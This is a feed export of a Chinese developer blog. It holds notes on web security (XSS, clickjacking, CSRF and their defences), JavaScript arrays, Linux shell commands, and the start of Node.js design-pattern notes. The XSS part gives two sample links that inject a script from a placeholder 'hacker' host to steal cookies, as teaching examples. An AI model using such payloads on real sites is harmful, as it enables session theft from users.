id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><h3 id="XSS-Cross-site-Scripting，跨站脚本攻击"><a href="#XSS-Cross-site-Scripting，跨站脚本攻击" class="headerlink" title="XSS(Cross-site Scripting，跨站脚本攻击)"></a>XSS(Cross-site Scripting，跨站脚本攻击)</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><ul><li><p>存储型 <code>XSS</code> 攻击<br>注入的攻击脚本永久存储在数据库，持久化。比如系统没有对用户的输入做过滤，可以插入一段自动发送网站 <code>cookie</code> 的脚本，当其他人打开包含这段信息的页面时就会自动获取隐私信息了，攻击的是多人。</p></li><li><p>反射型 <code>XSS</code> 攻击<br>非持久化的，需要欺骗用户自己去点击链接才能触发 <code>XSS</code> 代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。比如我们知道服务器会将搜索的关键词直接显示，我们就构造一个 <code>XSS</code> 的链接(<code>&lt;a href=&quot;http://xsstest.qq.com/search.php?q=%3Cscript src%3Dhttp%3A%2F%2Fhacker.qq.com%2Fhacker.js%3E%3C%2Fscript%3E&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;atype=&amp;filterFineness=&amp;rr=1&amp;pcat=food2011&amp;style=grid&amp;cat=&quot;&gt;点击就送998&lt;/a&gt;</code>)，这样就能将该用户的在该网站的 <code>cookie</code> 获取到了。这是针对单人的。</p></li><li><p>DOM 型 <code>XSS</code> 攻击<br>和反射性非常类似，不过是不需要经过服务器的，比如网站有个脚本是直接获取用户输入的 <code>url</code> 中的某个参数如 <code>content</code>，那么就可以伪造一个 <code>XSS</code> 的链接(<code>&lt;a href=&quot;http://example.com?content=&quot;%3Cscript src%3Dhttp%3A%2F%2Fhacker.qq.com%2Fhacker.js%3E%3C%2Fscript%3E&quot;&gt;</code>)从而完成 <code>XSS</code> 攻击，这种攻击也是单人的，只不过服务器设置的 <code>XSS</code> 防御就不起作用了，所以需要 <strong>前端同时防范</strong>。</p></li></ul><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p><code>XSS</code> 防御的总体思路是：对输入(和 <code>URL</code> 参数)进行过滤，对输出进行编码。这里推荐 <code>OWASP</code>。</p><ul><li><p><code>HttpOnly</code><br><code>Set-Cookie: =[; =][; expires=][; domain=][; path=][; secure][; HttpOnly]</code>，如果 <code>Cookie</code> 具有 <code>HttpOnly</code> 特性且不能通过客户端脚本访问，则为 <code>true</code>；否则为 <code>false</code>。默认值为 <code>false</code>。</p></li><li><p>过滤<br>对诸如<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;a&gt;</code> 等标签进行过滤。</p></li><li><p>编码<br>像一些常见的符号，如 <code>&lt;</code>、<code>&gt;</code> 在输入的时候要对其进行转换编码。</p></li><li><p>限制<br><code>XSS</code> 攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。</p></li><li><p><code>CSP</code>(Content Security Policy 内容安全策略)<br><code>CSP</code> 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。<br>查看 <a href="https://github.com/joeyguo/blog/issues/5" target="_blank" rel="noopener">XSS 终结者-CSP 理论与实践</a></p></li></ul><h3 id="Click-Jacking-点击劫持"><a href="#Click-Jacking-点击劫持" class="headerlink" title="Click Jacking(点击劫持)"></a>Click Jacking(点击劫持)</h3><p>点击劫持就是利用透明的 <code>iframe</code> 或者被覆盖的 <code>iframe</code>，通过诱骗用户在该网页上点击某些按钮，触发 <code>iframe</code> 页面上的点击操作。</p><p>防御：<code>X-Frame-Options</code> 响应头。用来给浏览器指示允许一个页面可否在 <code>&lt;frame&gt;</code>, <code>&lt;/iframe&gt;</code> 或者 <code>&lt;object&gt;</code> 中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持的攻击。</p><h3 id="CSRF-Cross-site-Request-Forgery，跨站请求伪造"><a href="#CSRF-Cross-site-Request-Forgery，跨站请求伪造" class="headerlink" title="CSRF(Cross-site Request Forgery，跨站请求伪造)"></a>CSRF(Cross-site Request Forgery，跨站请求伪造)</h3><p><img src="/assets/img/CSRF.jpg" alt="CSRF"></p><h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ul><li><p>Cookie-to-Header Token<br>表单的数据需要一个 <code>token</code>，这个 <code>token</code> 通过 <code>cookie</code> 来生成，服务器验证。这样攻击者伪造的请求中 <code>token</code> 不对就认为是一次 <code>CSRF</code> 攻击。</p></li><li><p>验证码<br>重要的操作让用户输入验证码，非常安全。但是用户体验差。</p></li><li><p>验证 HTTP Refer 字段<br>验证请求来源，没啥用，可以改。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;网络模型&quot;&gt;&lt;a href=&quot;#网络模型&quot; class=&quot;headerlink&quot; title=&quot;网络模型&quot;&gt;&lt;/a&gt;网络模型&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/assets/img/network_model.png&quot; alt=&quot;Network Model&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;TCP/IP&lt;/code&gt; 四层模型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;应用层、运输层、网际层和网络接口层。从实质上讲，只有上边三层，网络接口层没有什么具体的内容。&lt;code&gt;HTTP&lt;/code&gt; 对应应用层。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;OSI&lt;/code&gt; 七层模型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;应用层（&lt;code&gt;Application&lt;/code&gt;）、表示层（&lt;code&gt;Presentation&lt;/code&gt;）、会话层（&lt;code&gt;Session&lt;/code&gt;）、传输层（&lt;code&gt;Transport&lt;/code&gt;）、网络层（&lt;code&gt;Network&lt;/code&gt;）、数据链路层（&lt;code&gt;Data Link&lt;/code&gt;）、物理层（&lt;code&gt;Physical&lt;/code&gt;）。&lt;code&gt;HTTP&lt;/code&gt; 也是对应应用层。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;五层模型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;应用层、运输层、网络层、数据链路层和物理层。&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="js" scheme="http://1016990109.github.io/tags/js/"/>
    
      <category term="http" scheme="http://1016990109.github.io/tags/http/"/>
    
      <category term="tcp" scheme="http://1016990109.github.io/tags/tcp/"/>
    
      <category term="xss" scheme="http://1016990109.github.io/tags/xss/"/>
    
      <category term="csrf" scheme="http://1016990109.github.io/tags/csrf/"/>
    
      <category term="网络模型" scheme="http://1016990109.github.io/tags/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/"/>
    
      <category term="跨域" scheme="http://1016990109.github.io/tags/%E8%B7%A8%E5%9F%9F/"/>
    
      <category term="点击劫持" scheme="http://1016990109.github.io/tags/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之JS数组</title>
    <link href="http://1016990109.github.io/2018/07/19/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BJS%E6%95%B0%E7%BB%84/"/>
    <id>http://1016990109.github.io/2018/07/19/前端基础之JS数组/</id>
    <published>2018-07-19T07:18:41.000Z</published>
    <updated>2018-09-06T07:20:41.679Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ol><li><code>push(val1,val2,...)</code>、<code>pop</code> 操作，增加和删除，后进先出。返回数组的长度、弹出的元素。</li><li><code>unshift(val1,val2,...)</code>、<code>shift()</code> 对应在开头添加元素和删除元素。返回数组的长度、弹出的元素。</li><li><code>splice(start,deleteCount,val1,val2,...)</code> 从开始位置删除一定数量的元素，并从这个位置插入新的元素。返回删除的数组。</li><li><code>reverse()</code> 反向。返回数组本身。</li><li><code>sort([orderfunction])</code> 排序。</li><li><code>slice([start] [,end])</code> 返回子数组，拷贝后的，复制一个数组简单地 <code>slice()</code>。</li><li><code>join(seperator)</code> 返回以 <code>seperator</code> 作为间隔的字符串，默认为 <code>,</code>。</li><li><code>concat([arr1][,arr2]...)</code> 连接数组并返回新的数组，<code>concat()</code> 复制数组。</li><li>其他：<code>indexOf(val)</code>,<code>includes(val)</code>,<code>toString</code>(同 <code>join()</code> 或 <code>join(&quot;,&quot;)</code>),<code>forEach()</code>,<code>every</code>,<code>findIndex</code>,<code>map</code>,<code>reduce</code>,<code>keys</code>,<code>values</code>。</li></ol><a id="more"></a><h2 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h2><p>1.字符串反向：例：<code>123abc</code> =&gt; <code>cba321</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'123abc'</span></span><br><span class="line">  .split(<span class="string">''</span>)</span><br><span class="line">  .reverse()</span><br><span class="line">  .join(<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>2.拍平数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, [<span class="number">2</span>, [<span class="number">3</span>], <span class="number">4</span>], <span class="number">5</span>]</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> arr) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(arr[i])) &#123;</span><br><span class="line">      arr.splice(i, <span class="number">1</span>, ...flatten(arr[i]))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br><span class="line">flatten(arr)</span><br></pre></td></tr></table></figure><p>3.打印数组全排列：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allRange</span> (<span class="params">arr, path, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!arr.length) &#123;</span><br><span class="line">        res.push(path)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    arr.forEach(<span class="function">(<span class="params">v, idx</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> t = arr.slice()</span><br><span class="line">        <span class="keyword">const</span> p = path.slice()</span><br><span class="line">        t.splice(idx, <span class="number">1</span>)</span><br><span class="line">        p.push(v)</span><br><span class="line">        allRange(t, p, res)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">const</span> b = []</span><br><span class="line">allRange(a, [], b)</span><br><span class="line"><span class="built_in">console</span>.log(b)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;基本用法&quot;&gt;&lt;a href=&quot;#基本用法&quot; class=&quot;headerlink&quot; title=&quot;基本用法&quot;&gt;&lt;/a&gt;基本用法&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;push(val1,val2,...)&lt;/code&gt;、&lt;code&gt;pop&lt;/code&gt; 操作，增加和删除，后进先出。返回数组的长度、弹出的元素。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unshift(val1,val2,...)&lt;/code&gt;、&lt;code&gt;shift()&lt;/code&gt; 对应在开头添加元素和删除元素。返回数组的长度、弹出的元素。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;splice(start,deleteCount,val1,val2,...)&lt;/code&gt; 从开始位置删除一定数量的元素，并从这个位置插入新的元素。返回删除的数组。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;reverse()&lt;/code&gt; 反向。返回数组本身。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sort([orderfunction])&lt;/code&gt; 排序。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;slice([start] [,end])&lt;/code&gt; 返回子数组，拷贝后的，复制一个数组简单地 &lt;code&gt;slice()&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;join(seperator)&lt;/code&gt; 返回以 &lt;code&gt;seperator&lt;/code&gt; 作为间隔的字符串，默认为 &lt;code&gt;,&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;concat([arr1][,arr2]...)&lt;/code&gt; 连接数组并返回新的数组，&lt;code&gt;concat()&lt;/code&gt; 复制数组。&lt;/li&gt;
&lt;li&gt;其他：&lt;code&gt;indexOf(val)&lt;/code&gt;,&lt;code&gt;includes(val)&lt;/code&gt;,&lt;code&gt;toString&lt;/code&gt;(同 &lt;code&gt;join()&lt;/code&gt; 或 &lt;code&gt;join(&amp;quot;,&amp;quot;)&lt;/code&gt;),&lt;code&gt;forEach()&lt;/code&gt;,&lt;code&gt;every&lt;/code&gt;,&lt;code&gt;findIndex&lt;/code&gt;,&lt;code&gt;map&lt;/code&gt;,&lt;code&gt;reduce&lt;/code&gt;,&lt;code&gt;keys&lt;/code&gt;,&lt;code&gt;values&lt;/code&gt;。&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="js" scheme="http://1016990109.github.io/tags/js/"/>
    
      <category term="数组" scheme="http://1016990109.github.io/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>Linux 命令 —— 学习 Shell</title>
    <link href="http://1016990109.github.io/2018/07/12/Linux-%E5%91%BD%E4%BB%A4-%E5%AD%A6%E4%B9%A0Shell/"/>
    <id>http://1016990109.github.io/2018/07/12/Linux-命令-学习Shell/</id>
    <published>2018-07-12T14:38:04.000Z</published>
    <updated>2018-07-19T07:18:06.294Z</updated>
    
    <content type="html"><![CDATA[<p>系统学习 <code>Linux</code> 命令可以参考这本书：<a href="http://billie66.github.io/TLCL/book/index.html" target="_blank" rel="noopener">《The Linux Command Line》</a>。</p><h2 id="学习-Shell"><a href="#学习-Shell" class="headerlink" title="学习 Shell"></a>学习 Shell</h2><ul><li>如果提示符的最后一个字符是“#”, 而不是“$”, 那么这个终端会话就有超级用户权限。</li><li>如果是仿终端鼠标选中或者双击选中默认拷贝到缓冲区，按下鼠标中键可以粘贴。</li><li><code>ls</code> 命令选项：<code>-F</code> 如果是目录后面会加 <code>/</code>；<code>-h</code> 大小已可读的形式显示；<code>-S</code> 大小排序，<code>-t</code> 修改时间排序。</li><li><code>file</code> 命令打印文件内容简单描述，<code>file log.log</code>。</li><li><code>Linux</code> 系统中的目录：</li></ul><a id="more"></a><table><thead><tr><th>目录</th><th>描述</th></tr></thead><tbody><tr><td>/</td><td>根目录。</td></tr><tr><td>/bin</td><td>包含系统启动和运行所必须的二进制程序。</td></tr><tr><td>/boot</td><td>包含 Linux 内核、初始 RAM 磁盘映像（用于启动时所需的驱动）和 启动加载程序。</td></tr><tr><td>/dev</td><td>这是一个包含设备结点的特殊目录。在这个目录里，内核维护着所有设备的列表。</td></tr><tr><td>/etc</td><td>这个目录包含所有系统层面的配置文件。它也包含一系列的 shell 脚本， 在系统启动时，这些脚本会开启每个系统服务。<code>crontab</code> 定时任务，<code>fstab</code> 存储设备列表和相应挂载点，<code>password</code> 用户账户列表。</td></tr><tr><td>/home</td><td>每个用户一个目录。</td></tr><tr><td>/lib</td><td>核心系统程序用的共享文件</td></tr><tr><td>/lost+found</td><td>每个使用 Linux 文件系统的格式化分区或设备，例如 ext3 文件系统， 都会有这个目录。</td></tr><tr><td>/media 或 /mnt(老的 Linux 版本)</td><td>包含可移动介质的挂载点。</td></tr><tr><td>/<strong>proc</strong></td><td>Linux 内核维护的虚拟文件系统，内核窥视孔。</td></tr><tr><td>/sbin</td><td>系统二进制文件，通常为超级用户保留。</td></tr><tr><td>/tmp</td><td>临时目录，<strong>重启会清空</strong>。</td></tr><tr><td>/usr/bin</td><td>系统安装的可执行程序。</td></tr><tr><td>/usr/lib</td><td>包含由/usr/bin 目录中的程序所用的共享库。</td></tr><tr><td>/usr/sbin</td><td>包含许多系统管理程序。</td></tr><tr><td>/usr/share</td><td>由/usr/bin 目录中的程序使用的共享数据。</td></tr><tr><td>/var</td><td>存放动态文件，各种数据库，假脱机文件， 用户邮件等等。</td></tr><tr><td>/var/log</td><td>这个/var/log 目录包含日志文件、各种系统活动的记录。其中最重要的一个文件是/var/log/messages。超级用户才能查看这些日志文件。</td></tr></tbody></table><ul><li>关于命令的命令<ul><li>type:解释一个命令</li><li>which:显示会执行哪个应用程序(查看命令在哪)</li><li>man:显示命令手册</li><li>apropos:在一些特定的包含系统命令的简短描述的数据库文件里查找关键字，然后把结果送到标准输出(和 <code>man -k</code> 相同)</li><li>info:显示命令 info(类似于网页，可以跳转，方便阅读命令文档)</li><li>whatis:显示一个命令简洁描述</li><li>alias:创建命令(给详细的命令取别名)，取消使用 <code>unalias</code></li></ul></li><li>重定向<ul><li>cat:连接文件</li><li>sort:排序</li><li>uniq:打印去除重复行</li><li>grep:匹配</li><li>wc:打印文件中换行符，字，和字节个数</li><li>head/tail:打印头部或尾部</li><li>tee:从 <code>Stdin</code> 读取数据，并同时输出到 <code>Stdout</code> 和文件，<code>ls | tee out.txt</code>。</li><li><code>&gt;</code> 重定向覆盖；<code>&gt;&gt;</code> 不覆盖。</li><li><code>&gt;ls-output.txt 2&gt;&amp;1</code> 先重定向到 <code>ls-output.txt</code> 再将标准错误(<code>2</code>)重定向到标准输出(<code>1</code>)，注意顺序反的是不行的；缩写：<code>&amp;&gt; ls-output.txt</code>。</li><li>重定向输出结果到一个叫做”/dev/null”的特殊文件可以忽略输出。</li><li><code>grep -v</code> 只打印不匹配的行；<code>grep -i</code> 忽略大小写。</li><li><code>tail -f</code> 实时浏览文件。</li></ul></li><li><code>echo</code><ul><li>支持正则表达式，如打印隐藏文件：<code>echo .[!.]?*</code>，直接 <code>echo .*</code> 会将代表当前工作目录和父目录的 <code>.</code> 和 <code>..</code> 也打印出来。</li><li>支持算数表达式，<code>echo $((expression))</code>，如 <code>echo $((2+2))</code>。注意：只支持整数。</li><li>花括号展开，<code>echo {Z..A}</code>。花括号表达式本身可能包含一个由逗号分开的字符串列表，或者一个整数区间，或者单个的字符的区间。可嵌套，如 <code>echo a{A{1,2},B{3,4}}b</code>。</li><li>通过 <code>$</code> 调用变量，<code>printenv</code> 打印有效的变量列表。</li><li>命令替换，允许把一个命令的输出作为展开模式来用，例如 <code>echo $(ls)</code> 把 <code>ls</code> 命令的结果作为一个临时变量打印出来。注意：除了圆括号加美元符，倒引号也可以支持命令替换，<code>echo `ls`</code>。</li><li>双引号，双引号可以阻止单词的分割，如 <code>ls -l two word.txt</code> 是意味着列出 <code>two</code> 和 <code>word.txt</code> 的内容，改为 <code>ls -l &quot;two word.txt&quot;</code> 就可以解决这个问题了。</li><li>单引号，禁止所有展开，不存在什么表达式，写啥就是啥。</li><li>转义字符，经常在双引号中使用转义字符，能转义的字符有 “$”, “!”, “&amp;”, “ “ 等等，如 <code>\$5.00</code>，单引号中反斜杠失去意义。<code>echo</code> 命令带上 <code>-e</code> 选项，能够解释转义序列，可以把转义序列放在 <code>$&#39; &#39;</code> 里面，例如 <code>echo -e &quot;Time&#39;s up\a&quot;</code> 或 <code>echo &quot;Time&#39;s up&quot; $&#39;\a&#39;</code> 都是可以的。</li></ul></li><li>命令行编辑<ul><li><code>clear</code> 清除屏幕，<code>history</code> 显示历史命令。</li><li><code>ctrl-a</code>(ahead) 移动到行首，<code>ctrl-e</code>(end) 移动到行尾，<code>ctrl-l</code> 相当于 <code>clear</code>，<code>alt-f</code>(forward) 前一个单词，<code>alt-b</code>(behind) 后一个单词。</li></ul></li><li><p>权限</p><ul><li><code>r</code> 可读，<code>w</code> 可写，<code>x</code> 可执行。</li><li><code>ls</code> 命令显示的十个字符，第一个代表文件类型，后面九个字符分 3 组，分别表示用户、用户组、其他的权限。</li><li>八进制数可以表示各种权限，因为权限有 3 类，组合方式就刚好只有 <code>2^3=8</code> 种，例如 <code>0</code> 代表 <code>000</code> – <code>---</code>，<code>7</code> 代表 <code>111</code> – <code>rwx</code>，所以我们经常看到有 <code>chmod 777</code> 这样类似的命令，就是通过 3 个数字用来修改文件或者文件夹的所有者、用户组、其他人的权限。</li><li><code>chmod</code> 命令符号表示法:</li></ul><p><code>u</code> 是所有者(<code>user</code>)，<code>g</code> 是用户组(<code>group</code>)，<code>o</code> 是其他人(<code>other</code>)；<code>+</code> 用来添加权限，<code>-</code> 用来删除权限，<code>=</code> 用来设置权限(除设置外的其他权限都删除)。例如 <code>chmod go=rw file</code> 意思是指定该文件的用户组和其他人拥有读权限和写权限，如果群组或者其他人之前拥有可执行权限则会被移除，<strong>而所有者的权限不会变动</strong>，<code>-R</code> 为递归赋予权限，只对文件夹有效。</p><ul><li><code>umask</code> 设置默认权限，使用掩码设置，类似网络 <code>ip</code> 之类的，<code>umask 0022</code> 展开就是 <code>000 000 010 010</code>，前三位先不管，后面依次对应所有者、用户组、其他人的权限，某一位如果为 <code>1</code> 就把该位代表的权限删除，<code>0022</code> 就意味着删除用户组和其他人的写权限，只能读，默认的权限是 <code>--- rw- rw- rw-</code>，是默认没有可执行权限的。</li><li>特殊权限，<code>setuid</code>(程序运行时从运行的用户切换到程序所有者用户)、<code>setgid</code>(类似于 <code>setuid</code> 把文件运行的所有组<code>id</code>换成文件所有组<code>id</code>))、<code>sticky</code>(阻止用户删除和重命名文件)，具体的可以查看 <a href="http://billie66.github.io/TLCL/book/chap10.html" target="_blank" rel="noopener">权限</a>。</li><li><code>chown [owner][:[group]] file</code> 更改文件的所有者或所有组。</li></ul></li><li><p>进程</p><ul><li>当系统启动的时候，内核先把一些它自己的活动初始化为进程，然后运行一个叫做 <code>init</code> 的程序。<code>init</code>， 依次地，再运行一系列的称为 <code>init</code> 脚本的 <code>shell</code> 脚本（位于 <code>/etc</code>），它们可以启动所有的系统服务。</li><li><code>ps</code> 简单查看进程。<code>x</code>(注意不是 <code>-x</code>)选项显示进程在哪个终端控制的、状态(<code>STAT</code>， <code>R</code> 正在运行，<code>S</code> 正在睡眠，<code>D</code> 不可中断睡眠，<code>T</code> 已停止，<code>Z</code> 一个死进程，<code>&lt;</code> 一个高优先级级才能更，<code>N</code> 低优先级进程)，<strong>启用的命令</strong>(这个可能很有用)。<code>ps aux</code> 是经常用的一个显示更加详细信息的命令，</li><li><code>top</code> 程序以进程活动顺序显示连续更新的系统进程列表。以 <code>CPU</code> 使用率排序。</li><li>一个进程放到后台执行，只要在后面加上 <code>&amp;</code> 字符，如 <code>vi foo.txt &amp;</code>。</li><li>将进程放回前台执行，先用 <code>jobs</code> 找到对应的任务，比如 <code>[1] suspended(tty output) vi foo.txt</code>，任务就是 <code>1</code>，接着使用 <code>fg</code>(可以 <code>foreground</code> 记忆) 命令 <code>fg %1</code>。</li><li><code>Ctrl-Z</code> 停止一个前台任务，将任务移动到后台。同样地使用 <code>fg</code> 命令可以将后台进程移动到前台。</li><li><code>kill [-signal] PID</code>，发送信号给对应 <code>PID</code> 的进程，默认是终止信号(<code>TERM</code>)。<code>signal</code> 可以用数字也可以用字母，建议用字母，好记，<code>HUP</code> 挂起，<code>INT</code> 中断(类似 <code>Ctrl-C</code>)，<code>KILL</code> 杀死(不通知进程，直接在内核杀死)，<code>TERM</code> 终止，<code>CONT</code> 发送停止信号后可以使用这个来恢复，<code>STOP</code> 停止进程。<strong><code>kill -l</code> 列出完整信号列表</strong>。</li><li><code>pstree</code> 输出一个树型结构的进程列表，这个列表展示了进程间父/子关系。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;系统学习 &lt;code&gt;Linux&lt;/code&gt; 命令可以参考这本书：&lt;a href=&quot;http://billie66.github.io/TLCL/book/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《The Linux Command Line》&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&quot;学习-Shell&quot;&gt;&lt;a href=&quot;#学习-Shell&quot; class=&quot;headerlink&quot; title=&quot;学习 Shell&quot;&gt;&lt;/a&gt;学习 Shell&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;如果提示符的最后一个字符是“#”, 而不是“$”, 那么这个终端会话就有超级用户权限。&lt;/li&gt;
&lt;li&gt;如果是仿终端鼠标选中或者双击选中默认拷贝到缓冲区，按下鼠标中键可以粘贴。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls&lt;/code&gt; 命令选项：&lt;code&gt;-F&lt;/code&gt; 如果是目录后面会加 &lt;code&gt;/&lt;/code&gt;；&lt;code&gt;-h&lt;/code&gt; 大小已可读的形式显示；&lt;code&gt;-S&lt;/code&gt; 大小排序，&lt;code&gt;-t&lt;/code&gt; 修改时间排序。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file&lt;/code&gt; 命令打印文件内容简单描述，&lt;code&gt;file log.log&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Linux&lt;/code&gt; 系统中的目录：&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://1016990109.github.io/tags/Linux/"/>
    
      <category term="Shell" scheme="http://1016990109.github.io/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>《Node.js 设计模式》读书笔记 第六章</title>
    <link href="http://1016990109.github.io/2018/07/04/Node-js-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E5%85%AD%E7%AB%A0/"/>
    <id>http://1016990109.github.io/2018/07/04/Node-js-设计模式读书笔记-第六章/</id>
    <published>2018-07-04T02:37:30.000Z</published>
    <updated>2018-07-24T11:51:00.288Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Design-Patterns-设计模式"><a href="#Design-Patterns-设计模式" class="headerlink" title="Design Patterns(设计模式)"></a>Design Patterns(设计模式)</h1><h2 id="Factory-工厂"><a href="#Factory-工厂" class="headerlink" title="Factory(工厂)"></a>Factory(工厂)</h2><h3 id="A-generic-interface-for-creating-objects-创建对象的通用接口"><a href="#A-generic-interface-for-creating-objects-创建对象的通用接口" class="headerlink" title="A generic interface for creating objects(创建对象的通用接口)"></a>A generic interface for creating objects(创建对象的通用接口)</h3><p>调用一个工厂，而不是直接使用 <code>new</code> 运算符或 <code>Object.create()</code> 从一个原型创建一个新的对象，在很多方面是非常方便和灵活的。</p><a id="more"></a><p>首先最重要的是，工厂允许我们将对象创建与实现分离开来；从本质上讲，一个工厂包装了一个新实例的创建，给了我们更多的灵活性和怎么创建的控制权。</p><p>在工厂内部，我们可以使用闭包，使用原型和 <code>new</code> 运算符，使用 <code>Object.create()</code> 创建新实例，甚至根据特定条件返回不同的实例。对于对象的使用者而言，是完全不知道这个实例是怎么进行创建的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createImage</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (name.match(<span class="regexp">/\.jpeg$/</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JpegImage(name)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.match(<span class="regexp">/\.gif$/</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> GifImage(name)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.match(<span class="regexp">/\.png$/</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> PngImage(name)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'Unsupported format'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> image = createImage(<span class="string">'photo.jpeg'</span>)</span><br></pre></td></tr></table></figure><h3 id="A-mechanism-to-enforce-encapsulation-强制封装的机制"><a href="#A-mechanism-to-enforce-encapsulation-强制封装的机制" class="headerlink" title="A mechanism to enforce encapsulation(强制封装的机制)"></a>A mechanism to enforce 